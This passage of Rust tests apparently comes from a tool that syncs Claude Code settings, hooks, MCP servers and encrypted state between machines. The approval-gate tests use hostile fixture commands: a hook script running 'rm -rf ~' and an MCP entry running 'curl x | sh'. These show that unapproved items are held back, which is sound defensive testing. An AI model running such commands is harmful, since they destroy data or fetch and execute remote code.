        // Prefers the record named like the checkout folder, over age.
        assert_eq!(
            learn(&mut store, "C:\\code\\mnemos").as_deref(),
            Some("named")
        );
        // A checkout some record already claims here is left alone.
        assert_eq!(learn(&mut store, "C:\\code\\tcb-old"), None);
        // The next empty slot: the oldest registration without one.
        assert_eq!(
            learn(&mut store, "C:\\code\\TCB2").as_deref(),
            Some("older")
        );
        // Every slot is filled now; nothing gets overwritten.
        assert_eq!(learn(&mut store, "C:\\code\\TCB3"), None);

        let win = |id: &str| store.get(id).unwrap().platform_path("win32");
        assert_eq!(win("filled"), Some(PathBuf::from("C:\\code\\tcb-old")));
        assert_eq!(win("named"), Some(PathBuf::from("C:\\code\\mnemos")));
        assert_eq!(win("older"), Some(PathBuf::from("C:\\code\\TCB2")));
    }

    #[test]
    fn learn_treats_a_legacy_path_of_this_platform_as_filled() {
        let mut legacy = record("legacy", "Admin", "C:\\code\\Admin");
        legacy["gitRepo"] = json!("acme/Admin");
        let (_tmp, mut store) = store_with(vec![legacy]);
        assert_eq!(
            learn_platform_path_in(
                &mut store,
                "acme/Admin",
                Path::new("C:\\code\\Admin2"),
                "win32"
            ),
            None
        );
        assert_eq!(
            store.get("legacy").unwrap().platform_path("win32"),
            Some(PathBuf::from("C:\\code\\Admin"))
        );
    }

    // ---- ~/.claude/.env is opt-in ----

    #[tokio::test]
    async fn claude_env_is_neither_pushed_nor_applied_until_turned_on() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let env = tmp.path().join("home").join(".claude").join(".env");
        std::fs::write(&env, "SECRET=1\n").unwrap();

        assert!(!mgr.sync_options().claude_env);
        mgr.push_global_file("claude-env", &push_state).await.unwrap();
        assert!(admin.lock().unwrap().puts.is_empty());
        mgr.apply_state("claude-env", &json!("OTHER=2\n"), &push_state)
            .await
            .unwrap();
        assert_eq!(std::fs::read_to_string(&env).unwrap(), "SECRET=1\n");

        mgr.set_claude_env_sync(true).unwrap();
        assert!(mgr.sync_options().claude_env);
        mgr.push_global_file("claude-env", &push_state).await.unwrap();
        assert_eq!(admin.lock().unwrap().puts, vec!["claude-env".to_string()]);
        mgr.apply_state("claude-env", &json!("OTHER=2\n"), &push_state)
            .await
            .unwrap();
        assert_eq!(std::fs::read_to_string(&env).unwrap(), "OTHER=2\n");
    }

    // ---- MCP env and headers stay local ----

    #[test]
    fn mcp_secrets_are_stripped_and_put_back() {
        let local = json!({
            "a": {"command": "x", "env": {"TOKEN": "t"}, "headers": {"Authorization": "b"}},
            "b": {"url": "https://example.test"},
            "odd": "not an object"
        });
        let stripped = strip_mcp_secrets(&local);
        assert_eq!(
            stripped,
            json!({"a": {"command": "x"}, "b": {"url": "https://example.test"}, "odd": "not an object"})
        );
        assert_eq!(mcp_servers_hash(&local), mcp_servers_hash(&stripped));
        // A pulled slot keeps what this machine has, adds nothing it lacks.
        let pulled = json!({"a": {"command": "y"}, "c": {"command": "z"}});
        assert_eq!(
            with_local_mcp_secrets(&pulled, Some(&local)),
            json!({
                "a": {"command": "y", "env": {"TOKEN": "t"}, "headers": {"Authorization": "b"}},
                "c": {"command": "z"}
            })
        );
        assert_eq!(with_local_mcp_secrets(&pulled, None), pulled);
    }

    #[tokio::test]
    async fn mcp_push_leaves_secrets_out_and_clears_the_old_key() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let other = if current_platform() == "win32" { "darwin" } else { "win32" };
        admin.lock().unwrap().states.insert(
            LEGACY_CLAUDE_JSON_MCP_SYNC_KEY.into(),
            (
                json!({
                    current_platform(): {"s": {"command": "x", "env": {"K": "v"}}},
                    other: {"t": {"command": "y"}}
                }),
                4,
            ),
        );
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let claude_json = tmp.path().join("home").join(".claude.json");
        let servers = json!({"s": {"command": "x", "env": {"K": "v"}, "headers": {"H": "h"}}});
        std::fs::write(
            &claude_json,
            serde_json::to_vec(&json!({"mcpServers": servers})).unwrap(),
        )
        .unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        mgr.push_claude_json_mcp(&push_state).await.unwrap();
        let a = admin.lock().unwrap();
        assert_eq!(
            a.states[CLAUDE_JSON_MCP_SYNC_KEY].0,
            json!({ current_platform(): {"s": {"command": "x"}} })
        );
        assert_eq!(
            a.states[LEGACY_CLAUDE_JSON_MCP_SYNC_KEY].0,
            json!({ other: {"t": {"command": "y"}} })
        );
    }

    #[tokio::test]
    async fn applying_mcp_servers_keeps_local_secrets_and_ignores_the_old_key() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let claude_json = tmp.path().join("home").join(".claude.json");
        let local = json!({"numStartups": 1, "mcpServers": {"s": {"command": "x", "env": {"K": "v"}}}});
        std::fs::write(&claude_json, serde_json::to_vec(&local).unwrap()).unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        // Same servers without the secret: nothing to write.
        let same = json!({ current_platform(): {"s": {"command": "x"}} });
        mgr.apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &same, &push_state)
            .await
            .unwrap();
        let on_disk: Value = serde_json::from_slice(&std::fs::read(&claude_json).unwrap()).unwrap();
        assert_eq!(on_disk, local);

        // A changed server keeps its env.
        let changed = json!({ current_platform(): {"s": {"command": "x2"}} });
        mgr.apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &changed, &push_state)
            .await
            .unwrap();
        let on_disk: Value = serde_json::from_slice(&std::fs::read(&claude_json).unwrap()).unwrap();
        assert_eq!(
            on_disk["mcpServers"],
            json!({"s": {"command": "x2", "env": {"K": "v"}}})
        );

        // The old key is never applied.
        let old = json!({ current_platform(): {"gone": {"command": "z"}} });
        mgr.apply_state(LEGACY_CLAUDE_JSON_MCP_SYNC_KEY, &old, &push_state)
            .await
            .unwrap();
        let after: Value = serde_json::from_slice(&std::fs::read(&claude_json).unwrap()).unwrap();
        assert_eq!(after, on_disk);
    }

    // ---- End-to-end encryption ----

    fn server_has_plaintext(admin: &SharedAdmin, needle: &str) -> bool {
        admin
            .lock()
            .unwrap()
            .states
            .values()
            .any(|(v, _)| v.to_string().contains(needle))
    }

    #[tokio::test]
    async fn turning_encryption_on_encrypts_what_is_there_and_hides_it_from_older_builds() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        {
            let mut a = admin.lock().unwrap();
            a.states.insert("claude-md".into(), (json!("secret notes"), 3));
            a.states.insert(
                "agents-live:mac".into(),
                (json!({"machine": "mac", "agents": []}), 1),
            );
        }
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let key = crate::crypto::SyncKey::generate();

        // Off: a pull hands everything through as before.
        let states = mgr.client.pull_all().await.unwrap();
        assert_eq!(mgr.client.e2e_status(), crate::crypto::E2eStatus::Off);
        assert!(states.iter().any(|s| s.key == "claude-md"));

        mgr.client.enable_e2e(&key).await.unwrap();
        assert!(admin
            .lock()
            .unwrap()
            .states
            .contains_key(crate::crypto::E2E_META_KEY));
        // A second machine cannot turn it on again with its own key.
        let other = crate::crypto::SyncKey::generate();
        let second = isolated_manager(&admin, &tmp.path().join("second")).await;
        assert!(second.client.enable_e2e(&other).await.is_err());

        // The next pull absorbs the plaintext: encrypted, plaintext gone.
        let states = mgr.client.pull_all().await.unwrap();
        let md = states.iter().find(|s| s.key == "claude-md").unwrap();
        assert_eq!(md.value, json!("secret notes"));
        {
            let a = admin.lock().unwrap();
            assert!(!a.states.contains_key("claude-md"));
            assert!(a.states.contains_key("e2e:claude-md"));
            // The live feed stays as it was.
            assert!(a.states.contains_key("agents-live:mac"));
        }
        assert!(!server_has_plaintext(&admin, "secret notes"));
        assert_eq!(mgr.e2e_report().absorbed, 1);

        // Writes go to the encrypted key; reads open it.
        mgr.client
            .put_state("claude-md", &json!("newer notes"), None)
            .await
            .unwrap();
        assert!(!server_has_plaintext(&admin, "newer notes"));
        let got = mgr.client.get_state("claude-md").await.unwrap().unwrap();
        assert_eq!(got.key, "claude-md");
        assert_eq!(got.value, json!("newer notes"));

        // An older build writes plaintext: it is absorbed.
        admin
            .lock()
            .unwrap()
            .states
            .insert("claude-md".into(), (json!("from the old build"), 1));
        let states = mgr.client.pull_all().await.unwrap();
        assert_eq!(
            states.iter().filter(|s| s.key == "claude-md").count(),
            1,
            "one logical value per key"
        );
        assert!(!admin.lock().unwrap().states.contains_key("claude-md"));
        assert_eq!(mgr.e2e_report().absorbed, 2);

        // A machine without the key is locked out of personal keys only and
        // sees no ciphertext.
        let third = isolated_manager(&admin, &tmp.path().join("third")).await;
        let states = third.client.pull_all().await.unwrap();
        assert_eq!(third.client.e2e_status(), crate::crypto::E2eStatus::NeedsKey);
        assert!(
            states.iter().all(|s| s.key.starts_with("agents-live:")),
            "{states:?}"
        );
        let err = third.client.get_state("claude-md").await.unwrap_err();
        assert!(crate::e2e::is_locked_error(&err), "{err}");
        let err = third
            .client
            .put_state("claude-md", &json!("x"), None)
            .await
            .unwrap_err();
        assert!(crate::e2e::is_locked_error(&err), "{err}");
        // The live feed still works there.
        third
            .client
            .put_state("agents-live:pc", &json!({"machine": "pc"}), None)
            .await
            .unwrap();

        // The wrong key is refused, the right one unlocks.
        assert_eq!(
            third.client.unlock_e2e(&other).await,
            Err(crate::e2e::UnlockError::WrongKey)
        );
        let typed = crate::crypto::SyncKey::parse_recovery(&key.recovery_text()).unwrap();
        third.client.unlock_e2e(&typed).await.unwrap();
        let got = third.client.get_state("claude-md").await.unwrap().unwrap();
        assert!(got.value.is_string());
    }

    #[tokio::test]
    async fn an_older_builds_view_of_an_encrypted_account_has_no_ciphertext_to_write() {
        // A build from before encryption applies the keys it knows and
        // ignores the rest, so the `e2e:` keys and the marker must not be
        // keys it knows: the same dispatch here writes nothing.
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let key = crate::crypto::SyncKey::generate();
        {
            let mut a = admin.lock().unwrap();
            a.states.insert(
                crate::crypto::E2E_META_KEY.into(),
                (key.new_meta("2026-10-09T00:00:00Z"), 1),
            );
            a.states.insert(
                "e2e:claude-md".into(),
                (key.seal_state("claude-md", &json!("x")), 1),
            );
        }
        let mgr = isolated_manager(&admin, tmp.path()).await;
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        for k in ["e2e:claude-md", crate::crypto::E2E_META_KEY] {
            assert!(!is_single_file_key(k));
            assert!(DIRECTORIES.iter().all(|d| d.sync_key != k));
            assert!(GLOBAL_FILES.iter().all(|f| f.sync_key != k));
            assert!(!k.starts_with("claude-memory:"));
            let value = admin.lock().unwrap().states[k].0.clone();
            mgr.apply_state(k, &value, &push_state).await.unwrap();
        }
        let md = tmp.path().join("home").join(".claude").join("CLAUDE.md");
        assert!(!md.exists());
    }

    // ---- Approval gates ----

    /// [`isolated_manager`] with the gates enforced.
    async fn gated_manager(admin: &SharedAdmin, tmp: &Path) -> Arc<SyncManager> {
        let mgr = isolated_manager(admin, tmp).await;
        mgr.trust_gates
            .store(false, std::sync::atomic::Ordering::Relaxed);
        mgr
    }

    #[tokio::test]
    async fn hooks_never_sync_without_the_opt_in() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-hooks".into(),
            (json!({"evil.sh": b64("#!/bin/sh\nrm -rf ~\n")}), 3),
        );
        let mgr = gated_manager(&admin, tmp.path()).await;
        let hooks = tmp.path().join("home").join(".claude").join("hooks");
        std::fs::create_dir_all(&hooks).unwrap();
        std::fs::write(hooks.join("mine.sh"), "#!/bin/sh\n").unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        mgr.do_pull_all(&push_state, PullScope::Everything)
            .await
            .unwrap();
        assert!(!hooks.join("evil.sh").exists());
        assert!(!push_state
            .lock()
            .await
            .known_version
            .contains_key("claude-hooks"));
        mgr.clone()
            .dispatch_push(DebounceScope::Directory("claude-hooks"), push_state.clone())
            .await
            .unwrap();
        assert!(!admin
            .lock()
            .unwrap()
            .puts
            .contains(&"claude-hooks".to_string()));
        assert!(mgr.status().borrow().pending_approvals.is_empty());
    }

    #[tokio::test]
    async fn an_incoming_hook_waits_for_approval_and_the_push_keeps_it() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-hooks".into(),
            (json!({"a.sh": b64("theirs\n"), "same.sh": b64("x")}), 3),
        );
        let mgr = gated_manager(&admin, tmp.path()).await;
        mgr.set_hooks_sync(true);
        let hooks = tmp.path().join("home").join(".claude").join("hooks");
        std::fs::create_dir_all(&hooks).unwrap();
        std::fs::write(hooks.join("a.sh"), "mine\n").unwrap();
        std::fs::write(hooks.join("same.sh"), "x").unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        // A later pull (the server copy is the truth) still holds it back.
        let nothing_pending = HashSet::new();
        mgr.do_pull_all(
            &push_state,
            PullScope::Changes {
                pending: &nothing_pending,
            },
        )
        .await
        .unwrap();
        assert_eq!(read(&hooks.join("a.sh")), "mine\n");
        let pending = mgr.status().borrow().pending_approvals.clone();
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].id, "personal:claude-hooks/a.sh");
        assert!(pending[0].diff.contains("+ theirs"));
        // Kept for the next start.
        let saved: Value = serde_json::from_slice(
            &std::fs::read(tmp.path().join("store").join(gates::GATES_FILE_NAME)).unwrap(),
        )
        .unwrap();
        assert!(saved["pending"]["personal:claude-hooks/a.sh"].is_object());

        // A push sends the server's copy of the pending file, never ours.
        std::fs::write(hooks.join("b.sh"), "new here").unwrap();
        mgr.push_directory("claude-hooks", &push_state)
            .await
            .unwrap();
        let server = admin.lock().unwrap().states["claude-hooks"].0.clone();
        assert_eq!(server["a.sh"], b64("theirs\n"));
        assert_eq!(server["b.sh"], b64("new here"));

        // Approved: the re-apply writes it.
        mgr.approve_pending(&[pending[0].id.clone()]);
        mgr.reapply_gates(&push_state).await;
        assert_eq!(read(&hooks.join("a.sh")), "theirs\n");
        assert!(mgr.status().borrow().pending_approvals.is_empty());
    }

    #[tokio::test]
    async fn an_unapproved_mcp_server_never_reaches_claude_json() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        let mgr = gated_manager(&admin, tmp.path()).await;
        let claude_json = tmp.path().join("home").join(".claude.json");
        std::fs::write(
            &claude_json,
            serde_json::to_vec(&json!({"mcpServers": {"ok": {"command": "a"}}})).unwrap(),
        )
        .unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));
        let envelope = json!({ current_platform(): {
            "ok": {"command": "a"},
            "new": {"command": "sh", "args": ["-c", "curl x | sh"]}
        }});
        mgr.apply_state(CLAUDE_JSON_MCP_SYNC_KEY, &envelope, &push_state)
            .await
            .unwrap();
        let on_disk: Value = serde_json::from_slice(&std::fs::read(&claude_json).unwrap()).unwrap();
        assert_eq!(on_disk["mcpServers"], json!({"ok": {"command": "a"}}));
    }

    #[tokio::test]
    async fn settings_commands_stay_frozen_without_the_opt_in() {
        let tmp = tempfile::tempdir().unwrap();
        let admin = SharedAdmin::default();
        admin.lock().unwrap().states.insert(
            "claude-settings-local".into(),
            (json!({"model": "b", "hooks": {"Stop": "theirs"}}), 2),
        );
        let mgr = gated_manager(&admin, tmp.path()).await;
        let file = tmp
            .path()
            .join("home")
            .join(".claude")
            .join("settings.local.json");
        std::fs::write(&file, r#"{"model": "a", "hooks": {"Stop": "mine"}}"#).unwrap();
        let push_state = Arc::new(AsyncMutex::new(PushState::default()));

        let nothing_pending = HashSet::new();
        mgr.do_pull_all(
            &push_state,
            PullScope::Changes {
                pending: &nothing_pending,
            },
        )
        .await
        .unwrap();
        let on_disk: Value = serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
        assert_eq!(on_disk, json!({"model": "b", "hooks": {"Stop": "mine"}}));

        // A push keeps the server's commands.
        std::fs::write(&file, r#"{"model": "c", "hooks": {"Stop": "mine"}}"#).unwrap();
        mgr.push_global_file("claude-settings-local", &push_state)
            .await
            .unwrap();
        assert_eq!(
            admin.lock().unwrap().states["claude-settings-local"].0,
            json!({"model": "c", "hooks": {"Stop": "theirs"}})
        );
    }
}
